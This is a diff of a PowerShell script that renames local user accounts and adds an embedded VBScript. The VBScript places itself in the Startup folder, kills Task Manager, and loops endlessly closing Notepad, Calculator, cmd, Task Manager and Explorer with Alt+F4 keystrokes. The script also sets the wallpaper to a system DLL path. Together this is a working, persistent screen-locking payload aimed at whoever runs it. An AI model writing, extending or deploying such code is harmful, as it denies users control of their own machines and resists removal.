@@ -44,37 +44,60 @@ foreach ($user in $users) {
     Rename-LocalUser -Name $user.Name -NewName $newName
 }
 
+
 # Create VBScript file
 $vbsScript = @"
-Set objShell = CreateObject("WScript.Shell")
-objShell.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", "C:\Windows\System32\imageres.dll", "REG_SZ"
-objShell.Run "RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, True
+Set WshShell = WScript.CreateObject("WScript.Shell")
+strExeNames = Array("notepad.exe", "calc.exe", "cmd.exe", "taskmgr.exe", "explorer.exe")
 
-Set objShell = WScript.CreateObject("WScript.Shell")
-Set objShellApp = CreateObject("Shell.Application")
-Set objDesktop = objShellApp.Namespace(0)
-Set objFolder = objDesktop.Self
+'Add script to Startup folder
+strStartupPath = WshShell.SpecialFolders("Startup")
+Set objShellLink = WshShell.CreateShortcut(strStartupPath & "\CloseWindows.vbs.lnk")
+objShellLink.TargetPath = WScript.ScriptFullName
+objShellLink.Save
 
-Do While True
-    For Each objItem In objFolder.Items
-        'get random x and y coordinates
-        Randomize
-        xPos = Int((Screen.Width - objItem.Width) * Rnd)
-        yPos = Int((Screen.Height - objItem.Height) * Rnd)
-        
-        'move the item to the random position
-        objShellApp.MoveItem objItem, xPos, yPos
+'Check if Task Manager is running, and if so, close it
+Set objWmi = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\.\root\cimv2")
+Set colProcessList = objWmi.ExecQuery("Select * from Win32_Process Where Name = 'taskmgr.exe'")
+If colProcessList.Count > 0 Then
+    For Each objProcess In colProcessList
+        objProcess.Terminate()
     Next
-    WScript.Sleep 1000 'wait for 1 second before moving items again
+End If
+
+Do
+    For Each strExeName In strExeNames
+        Set objWmi = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\.\root\cimv2")
+        Set colProcessList = objWmi.ExecQuery("Select * from Win32_Process Where Name = '" & strExeName & "'")
+        
+        If colProcessList.Count > 0 Then
+            For Each objProcess In colProcessList
+                WshShell.AppActivate objProcess.ProcessId
+                WScript.Sleep 0 'wait for window to activate before closing
+                WshShell.SendKeys "%{F4}" 'sends Alt+F4 to close window
+            Next
+        End If
+    Next
+    
+    'Type "n" into search bar with focus
+    WshShell.SendKeys "n"
+    
+    WScript.Sleep 0 'wait before checking again
 Loop
 "@
 
-$vbsFilePath = [System.IO.Path]::Combine($desktopPath, "script.vbs")
+# Save the VBScript file to the desktop
+$vbsFilePath = [System.IO.Path]::Combine($desktopPath, "CloseWindows.vbs")
 $vbsScript | Out-File -FilePath $vbsFilePath -Encoding ASCII
 
 # Run the VBScript file
 $WshShell = New-Object -ComObject WScript.Shell
 $WshShell.Run($vbsFilePath)
+
+# Set wallpaper and update system parameters
+$objShell = New-Object -ComObject WScript.Shell
+$objShell.RegWrite("HKCU\Control Panel\Desktop\Wallpaper", "C:\Windows\System32\imageres.dll", "REG_SZ")
+$objShell.Run("RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, $true)
 
 $source = @"
 using System;
